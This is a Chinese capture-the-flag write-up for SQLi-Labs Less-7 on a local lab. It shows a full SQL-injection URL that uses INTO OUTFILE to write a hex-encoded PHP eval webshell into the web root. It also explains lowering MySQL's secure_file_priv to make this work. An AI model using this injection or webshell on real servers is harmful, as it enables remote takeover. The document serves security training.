【SQLi-Labs】Less-7 导出文件与 WebShell 写入 Writeup

操作者：何芊宏 | 操作日期：2026.10.24 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, MySQL, INTO OUTFILE

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-7 (GET - Dump into outfile - String)
  • 提示：GET请求，利用 INTO OUTFILE 导出文件，并写入 WebShell

2. 解题思路与前置原理

本关卡页面屏蔽了具体的 SQL 报错信息（仅提示 You have an error in your SQL syntax），且无数据回显。核心思路不再是读取数据，而是利用 MySQL 的 INTO OUTFILE 语句，将恶意的 PHP 代码（一句话木马）作为字符串导出到服务器的物理目录中，从而获得服务器权限。

核心前置配置（突破限制）：

MySQL 5.7 默认通过 secure_file_priv 参数限制文件的导入导出。若值为 NULL，则完全禁止；若为空 ""，则允许导出到任意目录。由于一开始执行 Payload 始终报错且无法生成文件，因此必须修改 MySQL 配置文件 my.ini。

操作步骤：在 phpStudy 的 my.ini 中，找到 [mysqld] 节点，添加 secure_file_priv=""，保存并重启 MySQL 服务使其生效。

3. 操作步骤与解析

第一步：探测注入点与确认闭合方式

输入 URL：依次尝试 ?id=1' --+、?id=1") --+、?id=1')) --+。

回显现象：输入 ?id=1')) --+ 时，页面正常回显 You are in.... Use outfile......。确认后台 SQL 语句的闭合方式为双引号加两层括号，即 id=(('$id'))。

第二步：构造并写入 WebShell

输入 URL：http://localhost/sqli-labs-master/Less-7/?id=-1')) UNION SELECT 1,2,0x3C3F70687020406576616C28245F504F53545B22636D64225D293B203F3E INTO OUTFILE 'D:/phpstudy_pro/WWW/sqli-labs-master/Less-7/shell.php' --+

解释与原理：

  • -1'))：使用不存在的 ID 占位，并闭合原有语法。
  • UNION SELECT 1,2,0x3C3F...：由于查询了 3 列，前面用 1,2 占位。第 3 列放入的是一句话木马的十六进制编码（0x3C... 对应 ），使用十六进制可以有效避免引号冲突和后端转义导致的语法错误。
  • INTO OUTFILE '路径'：将查询结果（即木马代码）写入指定的物理路径。注意 Windows 环境下路径必须使用正斜杠 /。

回显现象：页面提示 You have an error in your SQL syntax。

但经检查本地文件目录：在 D:/phpstudy_pro/WWW/sqli-labs-master/Less-7/ 下成功生成了 shell.php 文件。实战中，INTO OUTFILE 写入成功后页面依然报错的现象属于常见的“假报错”，以文件是否实际生成为准。

4. 踩坑记录与复盘

  • secure_file_priv 限制：这是导致写文件失败的最主要原因。在未修改配置前，执行 Payload 会直接报错且文件无法生成。修改 my.ini 后需重启服务。
  • Windows 路径格式：在 SQL 语句中，Windows 路径的反斜杠 \ 极易被转义。必须使用正斜杠 / 或双反斜杠 \\。
  • Payload 编码：直接书写包含各种引号的 PHP 代码极易破坏 SQL 语法。将其转换为十六进制（Hex）是最好的绕过方式。
  • 页面报错与结果分离：在执行文件写入操作时，不要迷信页面的“成功”或“失败”提示。必须去系统底层（文件管理器）确认文件是否真正落地。

5. 知识点总结与木马解析

  • INTO OUTFILE：MySQL 导出数据的语句，常被攻击者用来向服务器写文件，配合 Web 目录权限即可写入 WebShell。
  • 一句话木马（WebShell）：代码为 。eval() 会将接收到的字符串作为 PHP 代码执行；$_POST['cmd'] 用于接收黑客工具（如蚁剑）发送的指令；@ 用于抑制报错。
